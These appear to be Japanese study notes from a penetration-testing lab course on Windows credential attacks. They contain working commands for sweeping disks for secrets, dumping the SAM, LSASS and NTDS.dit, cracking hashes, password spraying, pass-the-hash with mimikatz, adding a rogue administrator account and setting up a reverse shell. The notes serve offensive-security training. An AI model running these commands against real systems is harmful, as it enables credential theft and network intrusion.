# Credential Hunting
資格情報の検索対象
### 設定ファイル

実行ポリシーの変更（必要な場合）
```sh
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

スクリプト(コピペ)
```sh
Write-Host "=== 設定ファイルとセンシティブファイルの検索 ===" -ForegroundColor Cyan; $extensions = @("*.conf", "*.config", "*.cnf", "*.ini", "*.inc", "*.inc.php", "*.env", "*.yml", "*.yaml", "*.json", "*.xml", "config.php", "config.inc.php", "settings.php", "wp-config.php", ".htpasswd", ".htaccess", "docker-compose.yml", "credentials", "id_rsa", "id_dsa", "authorized_keys", "shadow", "passwd", "*password*", "*secret*", "*credential*", "*token*", "*auth*", "*.bak", "*.old", "*.save"); $excludePatterns = @("\\Windows\\", "\\Program Files\\", "\\Program Files (x86)\\", "\\AppData\\Local\\Temp\\", "\\Windows\\Temp\\", "\\$Recycle.Bin\\", "\\System Volume Information\\", "\\ProgramData\\Package Cache\\", "\\WindowsApps\\", "node_modules\\", "\\.git\\", "\\cache\\", "\\fonts\\", "\\locale\\"); $searchPaths = @("C:\"); foreach ($path in $searchPaths) { Write-Host "`n検索中: $path" -ForegroundColor Yellow; foreach ($ext in $extensions) { try { $files = Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $files) { Write-Host $file.FullName -ForegroundColor Green } } catch { } } }; Write-Host "`n=== .cnfファイル内のユーザー/パスワード情報 ===" -ForegroundColor Cyan; $cnfFiles = Get-ChildItem -Path "C:\" -Filter "*.cnf" -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $cnfFiles) { Write-Host "`nFile: $($file.FullName)" -ForegroundColor Yellow; try { $content = Get-Content $file.FullName -ErrorAction SilentlyContinue; $matches = $content | Select-String -Pattern "user|password|pass" -AllMatches | Where-Object { $_ -notmatch "^\s*#" -and $_ -notmatch "^\s*;" }; foreach ($match in $matches) { Write-Host $match.Line -ForegroundColor White } } catch { Write-Host "読み取りエラー: $_" -ForegroundColor Red } }; Write-Host "`n=== データベースファイルの検索 ===" -ForegroundColor Cyan; $dbExtensions = @(".sql", ".db", ".sqlite", ".sqlite3", ".db3", ".mdb", ".accdb", ".dbf"); foreach ($ext in $dbExtensions) { Write-Host "`nDB File extension: $ext" -ForegroundColor Yellow; try { $dbFiles = Get-ChildItem -Path "C:\" -Filter "*$ext" -Recurse -ErrorAction SilentlyContinue -File | Where-Object { $exclude = $false; foreach ($pattern in $excludePatterns) { if ($_.FullName -like "*$pattern*") { $exclude = $true; break } }; -not $exclude }; foreach ($file in $dbFiles) { Write-Host $file.FullName -ForegroundColor Green } } catch { } }; Write-Host "`n=== 検索完了 ===" -ForegroundColor Cyan
```

# Password Managerの探索
KeePassが含まれていないかを確認する
```sh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

John The Ripperの`keepass2ohn`を使って、ハッシュの形にできる
keepass2johnを使ってKeePassデータベースをHashcat用にフォーマットする
```sh
keepass2john Database.kdbx > keepass.hash
```

これをhashcatで辞書攻撃するためには、ファイル文頭の`Database:`を削除すれば良い
- -m 13400で辞書攻撃する
```sh
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# SAMへの攻撃
## 概要
- [[Windows 基礎]]のSAMの見出しを見て
どこにあるのか
- SAMデータベース
	- C:\Windows\System32\config\SAM
	- C:\Windows\System32\config\SYSTEM


ターゲットにローカル管理者アクセス権がある場合、コピーできるレジストリハイブが3つある
ハッシュをダンプしてクラックするときは、それぞれが特定の目的を持つ

| **レジストリハイブ**    | **含まれる情報**                                                                               | **攻撃者ができること（具体例）**                                                                                                                                  |
| --------------- | ---------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | ローカルアカウントのハッシュ（Windowsのローカルユーザーのパスワードハッシュ）<br>このsamは、SAMデータベースの意味samで、ユーザー名がsamというわけではない | - ハッシュをクラックすることで、他のシステム・ユーザーへ横展開<br>- 得たクレデンシャルを使ってRDPやSMB経由でシステムにアクセス                                                                              |
| `hklm\system`   | **SAMデータベースの暗号化に使用されるブートキー**                                                             | - ハッシュを抜き出し、権限昇格（Privilege Escalation）や横展開（Lateral Movement）に利用<br>- LSA Secrets の復号に使用し、保存されているクレデンシャルを取得                                          |
| `hklm\security` | **ドメインアカウントのキャッシュされた資格情報（NL$KM）**                                                        | -キャッシュされたドメインログオン情報をダンプし、ハッシュやパスワードを取得（mimikatz, secretsdump.py など）<br>- ドメインに参加している場合、管理者クレデンシャルを取得できる可能性がある<br>- ドメイン環境での横展開（DCや他のサーバーへのアクセス）<br> |


## reg.exeを使用してレジストリハイブをコピーする
 - `reg.exe`を使用して、これらのバックアップを作成できる
- 管理者としてCMDを起動すると、reg.exeを実行して、前述のレジストリハイブのコピーを保存できる
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```
- 技術的には`hklm\sam`と`hklm\system`のみが必要
- `hklm\security`は、ドメインに参加しているマシンでは、キャッシュされたドメインユーザーアカウントのハッシュが含まれている可能性があるから保存しておくと役に立つことがあるかも



## **ファイル転送**
以下のいずれかの例を使用して、ファイルを転送する
[[File Transfer]]の「LinuxでSMBサーバーを建てる」が一番ベスト
- Base64とかでやろうとしてもサイズが大きすぎて逆に大変


## Impacketのsecretsdump.pyでハッシュをダンプする
- secretsdump.pyがどこにあるかを調べる
```
locate secretsdump.py
```

- Pythonを使用してsecretsdump.pyを実行し、ターゲットホストから取得した各hiveファイルを指定して実行するだけ
```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
- secretsdumpはローカルのSAMハッシュをダンプする
	- もしターゲットがドメインに参加していて、hklm\securityにキャッシュされた認証情報があれば、それもダンプされていただろう。
-  secretsdumpが最初に実行するのは、システムのブートキーを取得する
	- その後、ローカルのSAMハッシュをダンプする
- SAMデータベースのハッシュは、ブートキーがなければ取得できない
	- ブートキーはSAMデータベースの暗号化と復号化に使用されるため、事前にレジストリハイブのコピーを取得しておくことが重要

secretsdump.pyの出力の上部に注目する
- ハッシュがNTハッシュなのか、LMハッシュなのかを教えてくれる
	- NTハッシュ
		- 最新のWindowsオペレーティングシステムのほとんどは、パスワードをNTハッシュとして保存する
	- LMハッシュ
		- Windows Vista および Windows Server 2008 より古いオペレーティングシステムは、パスワードを LM ハッシュとして保存する
- ハッシュの種類を知ることで、各ユーザーアカウントに関連付けられたNTハッシュをテキストファイルにコピーして、パスワードの解読を開始できる


### **ダンプされたハッシュの見方**
- `Administrator`, `Guest`, `DefaultAccount` のような **デフォルトアカウント** のNTLMハッシュは **`31d6cfe0d16ae931b73c59d7e0c089c0`** になっている
	- `31d6cfe0d16ae931b73c59d7e0c089c0`は、空のパスワードを指す
	- ハッシュをクラックする意味がない
- どこの部分をHashcatでクラックすればいいのか
	- ダンプされたものの構造
```sh
ユーザー名:RID:LMハッシュ:NTハッシュ:::
```
例
`bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`

| **フィールド** | **値**                              | **説明**                                                 |
| --------- | ---------------------------------- | ------------------------------------------------------ |
| ユーザー名     | `bob`                              | Windowsのユーザー名                                          |
| RID       | `1001`                             | 相対識別子（Relative Identifier）。Windowsの各ユーザーに割り当てられる一意のID  |
| LMハッシュ    | `aad3b435b51404eeaad3b435b51404ee` | LAN Manager（LM）ハッシュ。通常、新しいWindowsでは無効化されており、常にこの固定値になる |
| NTハッシュ    | `64f12cddaa88057e06a81b54e73b949b` | NTLM（NT）ハッシュ。Windowsパスワードのハッシュ化形式で、攻撃者がクラックを試みる部分      |
| その他       | `:::`                              | 予備フィールド（歴史的な名残で存在するが通常は空）                              |
NTハッシュの部分をまとめて`hashestocrack.txt`として、保存する
```shell-session
snowyowl644@htb[/htb]$ sudo nano hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```


## **Hashcatでハッシュをクラックする**
- .txtに、Impacketのsecretsdump.pyで分かったハッシュを一行ずつ書く
- Hashcatのハッシュタイプと関連する番号を確認する
	- https://hashcat.net/wiki/doku.php?id=example_hashes
- NTハッシュは、ハッシュタイプは1000
- rockyou.txtだとこんな感じ
```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

## リモートでのSAM・LSA攻撃
- ローカルで管理者権限を持つアカウントだと、ネットワーク上で、LSA認証情報もターゲットにすることができる
- リモートで取得できた次は、Hashcatでクラックする

LSAシークレットをリモートでダンプする
```shell-session
crackmapexec smb <ターゲットIP> --local-auth -u <ユーザー名> -p <パスワード> --lsa
```


このコマンドは、SMBを使ってターゲットのLSA Secretsを取得し、システム上に保存されている認証情報をダンプする目的で使用されます。
SAMをリモートでダンプする
```shell-session
crackmapexec smb <ターゲットIP> --local-auth -u <ユーザー名> -p <パスワード> --sam
```

# LSASSへの攻撃
## 概要
- LSASS.exe :（Local Security Authority Subsystem Service）
- ユーザーの認証を行うために、使うプロセス(.exe)のこと
- LSASS.exeはWindowsのセキュリティを司るプロセスで、さまざまな認証パッケージ（NTLMやKerberosなど）を呼び出して認証処理を実行する
- LSASS.exeでログインしたときの、メモリをダンプして、資格情報を抽出する

## **メモリダンプの作成方法**
タスクマネージャからメモリダンプを作成できる方法
「タスクマネージャーを開く」 > 「プロセスタブを選択」 > 「Local Security Authority Process を見つけて右クリック」 > 「ダンプファイルを作成を選択」
すると、`C:\Users\loggedonusersdirectory\AppData\Local\Temp`に`lsass.DMP`というファイルが作られるので、攻撃元に送って、ハッシュをクラックする

**Rundll32.exe & Comsvcs.dll メソッド**
- 最新のウイルス対策ツールは、この方法を悪意のある活動として認識する
- ダンプファイルを作成するコマンドを発行する前に、`lsass.exe`に割り当てられるプロセスID（`PID`）を調べる必要がある
CMD
```cmd-session
C:\Windows\system32> tasklist /svc
```
PowerShell
```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

 LSASSプロセスにPIDを割り当てたら、ダンプファイルを作成できる
 - `rundll32.exe`を実行して`comsvcs.dll`のエクスポートされた関数を呼び出す
	 - MiniDumpWriteDump（`MiniDump`）関数も呼び出して、LSASSプロセスメモリを指定されたディレクトリ（`C:\lsass.dmp`）にダンプする
	 - 最新のAVツールのほとんどは、これを悪意のあるものとして認識し、コマンドの実行を防止しちゃう
		 - 直面しているAVツールをバイパスまたは無効にする方法を検討する必要がある
PowerShell
```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <上で調べたId> C:\lsass.dmp full
```
ダンプできたファイルは、攻撃元に送っておく

## **ファイル転送**
以下のいずれかの例を使用して、ファイルを転送する
[[File Transfer]]の「LinuxでSMBサーバーを建てる」が一番ベスト
- Base64とかでやろうとしてもサイズが大きすぎて逆に大変

## **Pypykatzを使用して資格情報を抽出する**
- [pypykatz](https://github.com/skelsec/pypykatz)と呼ばれる強力なツールを使用して、.dmpファイルから資格情報を抽出することがでる
	- Pypykatzは、完全にPythonで書かれたMimikatzの実装

攻撃元のKali
```sh
pip3 install pypykatz
```

```shell-session
pypykatz lsa minidump <ダンプしてきたファイル>
```

出力されるログの詳細な情報の確認
- **MSV**
	- Windowsの認証パッケージで、LSAがSAMデータベースと照合してログオン認証を行う。
	- pypykatzは、SID、ユーザー名、ドメイン、NT & SHA1のパスワードハッシュを抽出。

- **WDIGEST**
	- 古い認証プロトコルで、Windows XP ～ Windows 8、Windows Server 2003 ～ 2012 でデフォルト有効。
	- LSASSがWDIGESTの認証情報を平文でキャッシュするため、攻撃対象のシステムでWDIGESTが有効であれば、パスワードが平文で見える可能性がある。
	- 近年のWindowsではデフォルトで無効化されており、Microsoftはこの問題に対するセキュリティアップデートを提供。

- **Kerberos**
	- Active Directory環境で使用されるネットワーク認証プロトコル。
	- ドメインユーザーは認証時にチケットを取得し、これを使って共有リソースへアクセスできる。
	- LSASSは、パスワード、暗号キー、チケット、PINをキャッシュするため、メモリから抽出可能。

- **DPAPI**
	- Windowsのデータ保護APIで、ユーザーごとにデータを暗号化・復号する。
	- 以下のアプリケーションがDPAPIを使用
		- Internet Explorer: 保存したサイトのユーザー名とパスワード
		- Google Chrome: 保存したサイトのユーザー名とパスワード
		- Outlook: メールアカウントのパスワード
		- リモートデスクトップ接続: 保存された接続用資格情報
		- 資格情報マネージャー: 共有リソース、Wi-Fi、VPNなどの資格情報
- MimikatzやPypykatzは、ログオンユーザーのDPAPIマスターキーを抽出し、それを用いて各アプリの認証情報を復号できる。

みつかったNTハッシュをHashCatでクラックすればできる
- ハッシュが一つの場合は、リストにしないでそのまま貼って大丈夫だって。
```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


# Active DirectoryとNTDS.ditへの攻撃
## 概要
- `Active Directory`（`AD`）は、現代の企業ネットワークで一般的で重要なディレクトリサービス
- 組織がWindowsを使用している場合、そのWindowsシステムの管理にはADが使われていると考えて間違いない
- ADと言えども、ターゲットにネットワーク越しにアクセス可能であることが前提となる
	- 初期侵入が成功し、内部ネットワーク上に足がかりを確保した後の手順をシミュレーションしている

Windowsシステムがドメインに参加した際の認証プロセス
- ドメインに参加したWindows端末の挙動
    - ログオン時の認証は、デフォルトで **SAMデータベース** ではなく **ドメインコントローラー** に送られる
    - ただし、SAMデータベースを完全に使えなくなるわけではない
- SAMデータベースを使ってローカルアカウントでログオンする方法
	- ホスト名を指定してログオン
		- 例: `WS01\ユーザー名`
	- ログオンUIで `./` を使う
		- 例: `./ユーザー名`

## ホストがADに参加しているかの確認

systeminfoコマンド
```sh
systeminfo | findstr /i "Domain"
```
- AD参加してる場合
> Domain:                HTB.LOCAL
> Logon Server:          \\HTB-DC01
- ADに参加してない場合
> Domain:                WORKGROUP

wmic コマンドでドメイン確認
```sh
wmic computersystem get domain
```
- 出力が WORKGROUP なら参加していない。
- それ以外の FQDN (例: corp.local) なら AD 参加済み。

PowerShellで確認
```sh
(Get-WmiObject Win32_ComputerSystem).PartOfDomain
```
- True → ドメイン参加している
-  False → ドメイン未参加

ネットワーク環境の確認
```sh
nltest /dsgetdc:yourdomain.local
```
## CrackMapExecを使用したADアカウントへの辞書攻撃

辞書攻撃を行う際の懸念
- 辞書攻撃をネットワーク経由で実行すると、多くのトラフィックを発生させるため 検出されやすい（ノイズが多い）
- グループポリシー（Group Policy）でログイン試行の回数制限が設定されている場合、短時間でロックアウトされる可能性もあり

回避策
- 辞書攻撃を実行する際は、できるだけターゲットに合わせてカスタマイズ するのが有効。
### **ターゲットに応じたカスタマイズとユーザー名の特定**
辞書攻撃の成功率を高めるには、**ターゲット企業の情報を収集し、ユーザー名の命名規則を特定することが重要**。  
以下の手順で、より効果的なユーザー名リストを作成できる。

#### **1. 企業情報の収集**

- **公式Webサイトやソーシャルメディアを調査**
- **社員名簿が公開されていれば活用**
- **従業員の名前を取得**（特に新入社員）
    - 多くの企業は **一定の命名規則** に従ってユーザー名を作成している

#### **2. ユーザー名の命名規則を特定**

企業によっては、従業員のユーザー名に共通のルールがある。  
例えば、`Jane Jill Doe` という名前の従業員がいる場合、以下のような形式が考えられる。

|ユーザー名の形式|例|
|---|---|
|頭文字＋姓|`jdoe`|
|頭文字（名＋ミドル名）＋姓|`jjdoe`|
|フルネーム（名＋姓）|`janedoe`|
|名.姓|`jane.doe`|
|姓.名|`doe.jane`|
|ニックネーム|`doedoehacksstuff`|

#### **3. メールアドレスの構造を利用**

- 企業のメールアドレスは `username@domain` の形式になっていることが多い
- 例えば、`jdoe@inlanefreight.com` というメールが見つかれば、`jdoe` がユーザー名である可能性が高い

#### **4. 追加の情報収集テクニック（MrB3nのヒント）**

- **Google検索でドメイン名を調べる**
    - `”@inlanefreight.com”` を検索すると、有効なメールアドレスが見つかる可能性
- **ソーシャルメディアのスクレイピング**
    - 取得したメールアドレスや名前をもとに、スクリプトでユーザー名候補を自動生成
- **ユーザー名の難読化（オブスクエーション）に注意**
    - 企業によっては `joe.smith` を `a907` のようにエイリアス化して隠すこともある
- **Google Dorksを活用**
    - `inlanefreight.com filetype:pdf` で検索すると、**PDFの作成者情報** にユーザー名が含まれていることがある
- **スクリプトでユーザー名を自動生成**
    - 収集した情報をもとに命名規則を推測し、多数の候補を作成
    - これらの候補を使い、パスワードスプレー攻撃を実行

### **ユーザー名リストの自動生成**

ユーザー名リストは**手動で作成することも可能**だが、**自動生成ツールを活用**すれば効率的に一般的なユーザー名フォーマットを作成できる。

### 1. わかっているユーザーネームをファイルにまとめる
```shell-session
snowyowl644@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```
#### **2. 自動リスト生成ツールを使用**
- **`Username Anarchy`**（Rubyベースのツール）を使用すると、**実名リストから複数のユーザー名パターンを生成可能**
- Gitを使って攻撃ホストにツールをクローンし、実際の名前リストに適用する

#### **3. `Username Anarchy` の利用方法**
1. **ツールをGitでクローン**
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
3. **リストを使ってユーザー名を生成**
```bash
./username-anarchy -i ../usernames.txt 
```
→ 実際の名前リストを基に、**一般的なユーザー名形式を自動的に作成**

パスワードにカスタムルールを適用する
```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```
### CrackMapExecで攻撃を開始する
- ターゲットドメインコントローラーに対する攻撃
	- SMBプロトコルと組み合わせることもできる

例 : ユーザー(-u) bwilliamson に対して、パスワードリスト（-p） `/usr/share/wordlists/fasttrack.txt`に含まれる一般的なパスワードを試行
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

ユーザー側もファイルを指定したい場合
```sh
crackmapexec smb 10.129.201.57 -u users.txt -p /usr/share/wordlists/fasttrack.txt
```
注意点: アカウントロックアウトのリスク
- 管理者がアカウントロックアウトポリシーを設定している場合、この攻撃によってターゲットアカウントがロックされる可能性がある
- 2022年1月時点 では、Windowsドメインに適用される デフォルトのグループポリシーではアカウントロックアウトポリシーは有効化されていない
- そのため、この攻撃に対して脆弱な環境に遭遇する可能性がある

## NTDS.ditのキャプチャ
- NT Directory Services (NTDS) 
	- AD（Active Directory）と共に利用されるディレクトリサービス
	- ネットワークリソースの検索と整理を行う
- NTDS.dit
	- ADに関連付けられた主要なデータベースファイル
		- すべてのドメインユーザー名、パスワードハッシュ、その他の重要なスキーマ情報が書いてある
	- フォレスト内のドメインコントローラー上の `%systemroot%/ntds` に保存
	- dit は「directory information tree（ディレクトリ情報ツリー）」の略
	- 入手できれば
		- SAM攻撃と同じ要領でドメイン上のすべてのアカウントを侵害できる可能性がある
- 取得に必要な権限
	- ローカル管理者（`Administrators group`）またはドメイン管理者（`Domain Admins group`）（または同等の）権限が必要

### Evil-WinRMでDCに接続
DC : Domain Contoroller
- Active Directory環境において認証やディレクトリサービスの提供など、重要な役割を担うサーバ
```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

### ローカルグループメンバーシップの確認
ログインしたユーザーの権限と、ローカルグループのメンバーシップを調べる
- ローカルグループ
	- それぞれのワークステーションやサーバー内のユーザーグループのこと
		- ADには、ドメインユーザーグループもあるけど、ここでは、DC内のユーザーってこと
目的 : 権限昇格する必要性があるのか、横展開する必要があるのかを判断するための情報収集

アカウントにローカル管理者権限があるかどうかを確認
NTDS.ditファイルのコピーを作成するには、ローカル管理者（`Administrators group`）またはドメイン管理者（`Domain Admins group`）（または同等の）権限が必要
```shell-session
*Evil-WinRM* PS C:\> net localgroup
```

ドメインを含むユーザーアカウントの権限の確認
```shell-session
*Evil-WinRM* PS C:\> net user <ユーザー名>
```

### Cのシャドウコピーの作成
vssadminを使用して、Cドライブまたは管理者がADの初期インストール時に選択した任意のボリュームの[VSS](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)を作成する
- VSSは、PPやシステムを停止しないで、読み書きがアクティブなボリュームのコピーを作成できる
```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

### VSS から NTDS.dit をコピーして、攻撃元に転送する
C:の作成できたVSSから、NTDS.ditファイルだけを抽出する
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy <Shadow Copy Volume Name>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

転送は、[[File Transfer]]の「LinuxでSMBサーバーを建てる」の方法で、攻撃元のLinuxを準備する

攻撃先のWindows用のコマンド
```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<攻撃元のIP>\CompData 
```


### CrackMapExecを使うことで自動化する
- 上記と同じ手順をすべて1つのコマンドでできる
- このコマンドを使用すると、VSSを利用して、ターミナルセッション内でNTDS.ditファイルの内容をすばやくキャプチャしてダンプする
- 攻撃元のホストで以下のコマンドを実行
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### ハッシュのクラックとPass-The-Hashでのログイン
- ハッシュのクラックは、SAM攻撃、LSASS攻撃と同様の手法でできる

Pass-The-Hash
- ハッシュを使用して、`Pass-the-Hash`（`PtH`）と呼ばれるタイプの攻撃を使用してシステムで認証
- PtH 攻撃は、[NTLM 認証プロトコル](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials)を利用して、パスワード ハッシュを使用してユーザーを認証する
	- ログインの形式として`username`:`clear-text password`の代わりに、`username`:`password hash`を使用できる

コマンド
```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

ターゲットへの初期侵入後、ネットワーク内で横展開を行う必要がある場合に、Pass-The-Hashを試みることができる

# Windowsでの資格情報ハンティング(Credential Hunting)
- `Credential Hunting`は、ファイルシステム全体とさまざまなアプリケーションを通じて詳細な検索を実行してクレデンシャルを発見するプロセス

## 検索
- ユーザがシステムのどこかにパスワードを文書化している可能性がある
- デフォルトの資格情報の中でさまざまなファイルを見つけることができる

IT 管理者は日常的に何をしていますか？資格情報が必要なタスクはどれですか？
と考えて、検索するのが大事

#### 検索する主な用語
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- Passphrases
- configuration
- dbcredential
- dbpassword
- pwd	Login
- Credentials

- [Lazagne](https://github.com/AlessandroZ/LaZagne)などのサードパーティのツールの利用
	- Webブラウザやその他のインストールされたアプリケーションが安全に保存できない可能性のある資格情報をすばやく発見することもできる
	- 攻撃元のサーバーから転送する必要がある
 
 lazagneが持つすべてのモジュールが実行される
```cmd-session
C:\Users\bob\Desktop> start LaZagne.exe all -vv
```

- [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)を使用して、多くの種類のファイルのパターンから検索することもできる
```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


- 追加の考慮事項
    - Windows環境で認証情報を探索するために利用できるツールやキーワードは数千種類存在する
    - 使用するツールや手法は、主に対象のコンピューターの役割に基づいて選択される
        - Windows Server OSの場合と、Windows Desktop OSの場合ではアプローチが異なる
    - システムの利用状況に常に留意することで、どこを探索すべきかが判断しやすくなる
    - ツールが動作している間に、ファイルシステム上のディレクトリをナビゲートおよび一覧表示することで、認証情報を発見できる場合もある
- 認証情報探索時に留意すべきその他の場所
    - SYSVOL共有フォルダ内のグループポリシーに含まれるパスワード
    - SYSVOL共有フォルダ内のスクリプトに含まれるパスワード
    - IT共有フォルダ上のスクリプトに含まれるパスワード
    - 開発用マシンやIT共有フォルダ上のweb.configファイル内のパスワード
    - unattend.xml
    - ADユーザーまたはコンピュータの説明フィールド内のパスワード
    - KeePassデータベース
        - ハッシュを抽出し、クラッキングすることで多数のアクセス権を獲得可能
    - ユーザーシステムや共有フォルダ上で見つかるファイル
        - 例：pass.txt、passwords.docx、passwords.xlsx、SharePoint上のファイル



# 横展開
# PtH(Pass the Hash)
- 攻撃者が認証にプレーンテキストパスワードの代わりにパスワードハッシュを使ってログインする認証
	- ハッシュを復号化する必要がない😃
	- 管理者権限または特定の権限が必要
	- ハッシュの取得方法
		- 侵害されたホストからローカル SAM データベースをダンプする。
		- ドメインコントローラ上のNTDSデータベース（ntds.dit）からハッシュを抽出する。
		- メモリからハッシュを引き出す（lsass.exe）


## Windows NTLM
- Microsoftの[Windows New Technology LAN Manager（NTLM）](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)は、ユーザーの身元を認証すると同時に、データの完全性と機密性を保護する一連のセキュリティプロトコル
- SSO
	- 一度認証すると、そのセッション中は再度ログインしなくてもOK
- チャレンジレスポンス認証
	- パスワードの「ハッシュ（暗号化された値）」のみを使って認証すること
- 欠陥ではあるが、レガシークライアントやサーバーとの互換性を確保するために一般的に使用されている
	- NTLM では、パスワードハッシュに「ソルト」がないから、そのまま認証に使えてしまう
- Windows 2000 以降は Kerberos が標準
	- Active Directory（AD）ドメイン環境では Kerberos がデフォルト になっている。
	- ただし、AD じゃない環境（ワークグループとか）では、NTLM が今でも使われる。

### Windowsで横方向への攻撃
具体的なシナリオ
Kali LinuxとかでターゲットのWindowsを攻撃して、そこからさらに掌握したWindowsで横展開していくイメージ
#### Mimikatz
- Mimikatzには`sekurlsa::pth`という名前のモジュールがあり、ユーザーのパスワードのハッシュを使用してプロセスを開始することで、パス・ザ・ハッシュ攻撃を実行できる

**NTLM ハッシュを使って `julio` の認証を突破し、新しい `cmd.exe` のセッションを取得**
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
- mimikatz.exe
	- Mimikatz を起動する。
- privilege::debug
	- 管理者権限を取得（デバッグ特権を有効化）。
	- sekurlsa::pth はカーネルメモリを直接操作するため、この権限が必要。
- `sekurlsa::pth`（Pass-the-Hash 攻撃）
	- Pass-the-Hash 認証を使って 新しいコマンドプロンプト (cmd.exe) を開く

| オプション             | 説明                                                     |
| ----------------- | ------------------------------------------------------ |
| `/user`           | 偽装したいユーザー名。                                            |
| `/rc4` or `/NTLM` | ユーザーのパスワードの NTLM ハッシュ。                                 |
| `/domain`         | なりすますドメイン名（ローカルユーザーの場合はコンピュータ名, `localhost`, `.` を指定）。 |
| `/run`            | ユーザーのコンテキストで実行するプログラム（指定しない場合は `cmd.exe`）。             |
**Mimikatzでログイン情報を抽出**
```PowerShell
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

```sh
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
- mimikatz.exe
	- Mimikatz を起動
- privilege::debug
	- 管理者権限を取得
	- sekurlsa::logonpasswords を実行するには デバッグ権限 が必要。
- sekurlsa::logonpasswords
	- **現在ログインしているユーザーのパスワード情報を取得**
	- メモリ上にある認証情報（パスワードハッシュなど）をダンプ
	- 取得できる情報：
	    - NTLM ハッシュ
	    - SHA1 ハッシュ
	    - DPAPI キー
	    - Kerberos チケット
	    - 生パスワード（`wdigest` などが有効なら）

#### PowerShell Invoke-TheHashでハッシュを渡す
- WMI と SMB でPath The Hash攻撃を実行するための PowerShell 関数
- 接続
	- NET TCPクライアント
- 認証
	- NTLMハッシュをNTLMv2認証プロトコルに渡す
- SMBかWMIコマンドが使える

#### 使用例
**mark という名前の新しいユーザーを作成し、そのユーザーを Administrators グループに追加する**
```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

| オプション      | 説明                                              |
| ---------- | ----------------------------------------------- |
| `Target`   | ターゲットのホスト名または IP アドレス。                          |
| `Username` | 認証に使用するユーザー名。                                   |
| `Domain`   | 認証に使用するドメイン（ローカルアカウントや `@domain` を指定する場合は不要）。   |
| `Hash`     | 認証のための NTLM パスワードハッシュ（`LM:NTLM` または `NTLM` 形式）。 |
| `Command`  | ターゲットで実行するコマンド（指定しない場合は WMI アクセス確認のみ）。          |

**リバースシェルを張る**
ターゲット側でncで待ち受ける
```powershell
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

- [https://www.revshells.com/](https://www.revshells.com/)の**PowerShell #3 (Base64)**を使う
	- リバースシェルで指定する**Windowsのメンバーサーバー**のIPは、グローバルIPじゃなくて、DC(Domain Contoroller)と繋がってるインターネットのIPにするんだぞ
	- 一回、`ipconfig`でIP列挙しないと沼る
- `Invoke-TheHash`を実行して、ターゲットのターゲットコンピュータでPowerShellリバースシェルスクリプトを実行する

```powershell
